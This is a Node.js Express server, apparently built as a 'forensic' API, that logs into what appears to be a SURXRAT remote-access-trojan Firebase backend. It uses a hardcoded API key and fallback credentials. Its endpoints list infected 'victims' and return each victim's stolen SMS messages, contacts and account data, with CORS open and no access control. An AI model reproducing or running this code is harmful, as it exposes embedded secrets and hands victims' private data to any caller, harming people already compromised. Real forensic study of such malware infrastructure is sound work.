const express = require('express');
const axios = require('axios');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Surxrat Configuration
const API_KEY = "AIzaSyBIQLjy-Tnjc1JMgLpoYI-2tnn8Nbo3Qdk";
const DB_URL = "https://kwontol-default-rtdb.firebaseio.com";

app.use(cors());
app.use(express.json());

// Helper to get Auth Token (REST API - Bypass 2FA)
async function getAuthToken() {
    const url = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${API_KEY}`;
    const payload = {
        email: process.env.RESEARCH_EMAIL || "research_alt_test@gmail.com",
        password: process.env.RESEARCH_PASSWORD || "ResearchAltPassword123!",
        returnSecureToken: true
    };
    const res = await axios.post(url, payload);
    return res.data.idToken;
}

// 1. List All Victims
app.get('/api/victims', async (req, res) => {
    try {
        const token = await getAuthToken();
        const response = await axios.get(`${DB_URL}/surxrat5.json?auth=${token}&shallow=true`);
        res.json({
            count: Object.keys(response.data).length,
            victims: Object.keys(response.data)
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// 2. Get Full Record for Victim
app.get('/api/victim/:uid', async (req, res) => {
    const { uid } = req.params;
    try {
        const token = await getAuthToken();
        
        // Fetch metadata, sms, contacts in parallel
        const paths = [
            `surxrat5/${uid}.json`,
            `database/sms/${uid}.json`,
            `database/contacts/${uid}.json`,
            `database/accounts/${uid}.json`
        ];

        const [meta, sms, contacts, accounts] = await Promise.all(
            paths.map(path => axios.get(`${DB_URL}/${path}?auth=${token}`).then(r => r.data))
        );

        // Remove cam_result for privacy/optimization
        if (meta && meta.cam_result) delete meta.cam_result;

        res.json({ uid, metadata: meta, sms, contacts, accounts });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// 3. Health Check
app.get('/', (req, res) => {
    res.send('SURXRAT V5 Forensic API Service is Online.');
});

app.listen(PORT, () => {
    console.log(`API Server running on port ${PORT}`);
});
